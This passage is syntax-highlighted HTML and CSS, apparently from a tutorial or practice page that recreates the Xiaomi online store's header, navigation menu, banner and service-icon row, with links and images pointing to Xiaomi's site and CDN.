&#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">background-color</span>: <span class="number">#424242</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">120px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">height</span>: <span class="number">40px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.submenu</span> <span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">1226px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.submenu</span> <span class="selector-class">.container</span> <span class="selector-class">.left</span> <span class="selector-class">.logo</span>&#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">height</span>: <span class="number">56px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">56px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">margin-top</span>: <span class="number">22px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.submenu</span> <span class="selector-class">.container</span> <span class="selector-class">.right</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">color</span>: <span class="number">#333333</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">padding</span>: <span class="number">12px</span> <span class="number">0</span> <span class="number">0</span> <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">font-size</span>: <span class="number">14px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">1140px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">height</span>: <span class="number">88px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.submenu</span> <span class="selector-class">.container</span> <span class="selector-class">.right</span> <span class="selector-class">.blank</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">height</span>: <span class="number">88px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">127px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">15px</span> <span class="number">0</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            </span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.submenu</span> <span class="selector-class">.container</span> <span class="selector-class">.right</span> <span class="selector-tag">a</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">color</span>: <span class="number">#333333</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">font-size</span>: <span class="number">16px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">padding</span>: <span class="number">26px</span> <span class="number">10px</span> <span class="number">38px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">text-decoration</span>: none;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.submenu</span> <span class="selector-class">.container</span> <span class="selector-class">.right</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">color</span>: <span class="number">#ff6700</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.submenu</span> <span class="selector-class">.container</span> <span class="selector-class">.right</span> <span class="selector-class">.search</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">float</span>: right;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">height</span>: <span class="number">40px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">margin-top</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.content</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">1226px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.content</span> <span class="selector-tag">img</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.subcontent</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">padding-top</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.subcontent</span> <span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">1226px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.subcontent</span> <span class="selector-class">.container</span> <span class="selector-class">.func</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">height</span>: <span class="number">170px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">237px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">background-color</span>: <span class="number">#665e57</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.subcontent</span> <span class="selector-class">.container</span> <span class="selector-class">.func</span> <span class="selector-class">.item</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">79px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">height</span>: <span class="number">85px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.subcontent</span> <span class="selector-class">.container</span> <span class="selector-class">.item</span> <span class="selector-class">.example</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">height</span>: <span class="number">170px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">316PX</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">padding-left</span>: <span class="number">12px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">float</span>: right;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.subcontent</span> <span class="selector-class">.container</span> <span class="selector-class">.func</span> <span class="selector-class">.item</span> <span class="selector-class">.des</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">font-size</span>: <span class="number">14px</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.subcontent</span> <span class="selector-class">.container</span> <span class="selector-class">.func</span> <span class="selector-class">.item</span> <span class="selector-tag">a</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">text-decoration</span>: none;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">opacity</span>: <span class="number">0.7</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.subcontent</span> <span class="selector-class">.container</span> <span class="selector-class">.func</span> <span class="selector-class">.item</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">opacity</span>: <span class="number">1</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">         </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;menu&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;func-left&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/index.html&quot;</span>&gt;</span>小米官网<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;sep&quot;</span>&gt;</span>|<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/index.html&quot;</span>&gt;</span>小米商城<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;sep&quot;</span>&gt;</span>|<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/index.html&quot;</span>&gt;</span>小米澎湃OS<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;sep&quot;</span>&gt;</span>|<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/index.html&quot;</span>&gt;</span>小米汽车<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;sep&quot;</span>&gt;</span>|<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/index.html&quot;</span>&gt;</span>云服务<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;sep&quot;</span>&gt;</span>|<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/index.html&quot;</span>&gt;</span>loT<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;sep&quot;</span>&gt;</span>|<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/index.html&quot;</span>&gt;</span>有品<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;func-right&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/index.html&quot;</span> <span class="attr">class</span>=<span class="string">&quot;shopcar&quot;</span>&gt;</span>购物车(0)<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/index.html&quot;</span>&gt;</span>消息通知<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;sep&quot;</span>&gt;</span>|<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/index.html&quot;</span>&gt;</span>注册<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;sep&quot;</span>&gt;</span>|<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/index.html&quot;</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;clear: both;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;submenu&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;left&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/index.html&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.cnbj1.fds.api.mi-img.com/mi.com-assets/shop/img/logo-mi2.png &quot;</span> <span class="attr">class</span>=<span class="string">&quot;logo&quot;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;right&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;blank&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/index.html&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">span</span>&gt;</span>Xiaomi手机<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/index.html&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">span</span>&gt;</span>Redmi手机<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/index.html&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">span</span>&gt;</span>电视<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/index.html&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">span</span>&gt;</span>笔记本<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/index.html&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">span</span>&gt;</span>家电<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/index.html&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">span</span>&gt;</span>路由器<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/index.html&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">span</span>&gt;</span>服务中心<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/index.html&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">span</span>&gt;</span>社区<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;search&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;🔍&quot;</span> <span class="attr">style</span>=<span class="string">&quot; height: 41px; float: right;&quot;</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;搜索商品名称&quot;</span> <span class="attr">style</span>=<span class="string">&quot;height: 35px;float: right;&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.cnbj1.fds.api.mi-img.com/mi-mall/397f2569b126d8fba446b6bbf57ef771.jpg?thumb=1&amp;w=1839&amp;h=690&amp;f=webp&amp;q=90&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;clear: both;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;clear: both;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;subcontent&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;func&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/index.html&quot;</span> &gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.cnbj1.fds.api.mi-img.com/mi-mall/82abdba456e8caaea5848a0cddce03db.png?w=48&amp;h=48&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span> <span class="attr">style</span>=<span class="string">&quot;height: 24px;width: 24px;display: block;margin: 0 auto;margin-top: 18px;&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;des&quot;</span>&gt;</span>保障服务<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;clear: both;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/index.html&quot;</span> &gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.cnbj1.fds.api.mi-img.com/mi-mall/82abdba456e8caaea5848a0cddce03db.png?w=48&amp;h=48&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span> <span class="attr">style</span>=<span class="string">&quot;height: 24px;width: 24px;display: block;margin: 0 auto;margin-top: 18px;&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;des&quot;</span>&gt;</span>保障服务<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;clear: both;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/index.html&quot;</span> &gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.cnbj1.fds.api.mi-img.com/mi-mall/82abdba456e8caaea5848a0cddce03db.png?w=48&amp;h=48&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span> <span class="attr">style</span>=<span class="string">&quot;height: 24px;width: 24px;display: block;margin: 0 auto;margin-top: 18px;&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;des&quot;</span>&gt;</span>保障服务<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;clear: both;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/index.html&quot;</span> &gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.cnbj1.fds.api.mi-img.com/mi-mall/82abdba456e8caaea5848a0cddce03db.png?w=48&amp;h=48&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span> <span class="attr">style</span>=<span class="string">&quot;height: 24px;width: 24px;display: block;margin: 0 auto;margin-top: 18px;&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;des&quot;</span>&gt;</span>保障服务<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;clear: both;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/index.html&quot;</span> &gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.cnbj1.fds.api.mi-img.com/mi-mall/82abdba456e8caaea5848a0cddce03db.png?w=48&amp;h=48&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span> <span class="attr">style</span>=<span class="string">&quot;height: 24px;width: 24px;display: block;margin: 0 auto;margin-top: 18px;&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;des&quot;</span>&gt;</span>保障服务<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;clear: both;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/index.html&quot;</span> &gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.cnbj1.fds.api.mi-img.com/mi-mall/82abdba456e8caaea5848a0cddce03db.png?w=48&amp;h=48&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span> <span class="attr">style</span>=<span class="string">&quot;height: 24px;width: 24px;display: block;margin: 0 auto;margin-top: 18px;&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;des&quot;</span>&gt;</span>保障服务<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;clear: both;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;clear: both;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span 